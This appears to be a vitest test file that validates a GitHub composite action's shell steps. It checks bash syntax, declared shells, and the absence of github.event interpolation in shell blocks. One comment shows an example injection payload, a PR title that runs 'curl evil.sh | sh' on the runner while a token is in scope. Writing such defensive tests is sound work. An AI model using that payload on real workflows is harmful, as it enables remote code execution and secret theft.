/**
 * Every `run:` block in the composite action must be valid bash.
 *
 * This exists because a stray `esac` shipped in one. Editing the fail-policy step replaced
 * a `case` statement and left its terminator behind, one line after `exit "$DECISION"`:
 *
 *     exit "$DECISION"
 *     esac              <- left over
 *
 * Nothing caught it. The YAML still parsed, so a structural check on action.yml passed; the
 * job still succeeded, because bash parses a script incrementally and `exit` runs before the
 * parser ever reaches the stray token. It was a latent syntax error that would surface the
 * moment anything was added after that `exit`, or under a shell that parses up front.
 *
 * `bash -n` parses without executing, which is exactly the check the runtime cannot give us.
 */
import { describe, expect, it } from 'vitest';
import { execFile } from 'node:child_process';
import { existsSync, mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { promisify } from 'node:util';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';
import { load } from 'js-yaml';
import { readFileSync } from 'node:fs';

const exec = promisify(execFile);
const ACTION = join(dirname(fileURLToPath(import.meta.url)), '../../.github/actions/align-check/action.yml');

if (!existsSync(ACTION)) throw new Error(`FATAL: ${ACTION} is missing`);

interface CompositeAction {
  runs: { steps: Array<{ name?: string; run?: string; shell?: string; env?: Record<string, string> }> };
}

const action = load(readFileSync(ACTION, 'utf8')) as CompositeAction;
const runSteps = action.runs.steps
  .map((s, i) => ({ ...s, index: i }))
  .filter(s => typeof s.run === 'string');

/** `${{ ... }}` is GitHub template syntax, not shell; substitute a literal before parsing. */
function shellSource(run: string): string {
  return run.replace(/\$\{\{[^}]*\}\}/g, 'X');
}

describe('composite action shell blocks', () => {
  // Positive control on the fixture itself: if the YAML shape ever changes and this finds
  // no run blocks, the suite below would pass vacuously against nothing.
  it('finds the run blocks to check', () => {
    expect(runSteps.length).toBeGreaterThanOrEqual(3);
  });

  it.each(runSteps.map(s => [s.name ?? `step ${s.index}`, s.run as string]))(
    'is valid bash: %s',
    async (_name, run) => {
      const dir = mkdtempSync(join(tmpdir(), 'align-action-'));
      const file = join(dir, 'step.sh');
      writeFileSync(file, shellSource(run));

      // bash -n parses the WHOLE file without running it, so it sees unreachable tokens
      // that execution never reaches.
      await expect(exec('bash', ['-n', file])).resolves.toBeDefined();
    }
  );

  it('declares a shell for every run block', () => {
    expect(runSteps.filter(s => !s.shell)).toEqual([]);
  });

  // `${{ github.event.* }}` is written by whoever opened the PR. Interpolated into a run
  // block it is substituted BEFORE bash sees the script, so a PR titled `"; curl evil.sh | sh; #`
  // executes on the runner with ALIGN_TOKEN in scope. Passed through `env:` it reaches the
  // shell as a variable's value, which is data. The rule is worth pinning generally rather
  // than per-field: every member of `github.event` is caller-controlled to some degree.
  it('never interpolates github.event into a shell block', () => {
    const offenders = runSteps
      .filter(s => /\$\{\{\s*github\.event\b/.test(s.run as string))
      .map(s => s.name ?? `step ${s.index}`);

    expect(offenders).toEqual([]);
  });

  it('detects the injection pattern when it is present', () => {
    // Negative control for the check above, which is an emptiness assertion and would pass
    // just as happily against a regex that matches nothing.
    const pattern = /\$\{\{\s*github\.event\b/;

    expect(pattern.test('echo "${{ github.event.pull_request.title }}"')).toBe(true);
  });

  it('supplies the PR title through env, so the check has a title to send', () => {
    // The other half: proving it is not interpolated is worth nothing if it is also not
    // passed at all, which would leave `--title` a flag nothing ever sets.
    const withTitle = action.runs.steps.filter(s => s.env?.PR_TITLE);

    expect(withTitle).toHaveLength(1);
    expect(withTitle[0]?.env?.PR_TITLE).toContain('github.event.pull_request.title');
    expect(withTitle[0]?.run).toContain('--title');
  });

  it('detects a syntax error when one is present', async () => {
    // The negative control. Without this, a `bash -n` that silently stopped working would
    // leave every case above passing and the gate would certify nothing.
    const dir = mkdtempSync(join(tmpdir(), 'align-action-bad-'));
    const file = join(dir, 'bad.sh');
    writeFileSync(file, 'case "$x" in\n  a) echo a ;;\nesac\nesac\n');

    await expect(exec('bash', ['-n', file])).rejects.toThrow();
  });
});
